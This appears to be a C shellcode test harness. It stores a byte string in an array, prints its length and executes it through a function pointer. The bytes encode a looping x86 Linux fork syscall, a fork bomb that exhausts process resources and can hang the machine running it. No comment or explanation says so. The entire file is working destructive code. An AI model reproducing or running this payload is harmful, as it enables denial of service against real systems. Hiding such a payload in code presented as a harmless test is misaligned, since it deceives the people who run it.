#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x83\xc0\x02\xcd\x80\xeb\xf7";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
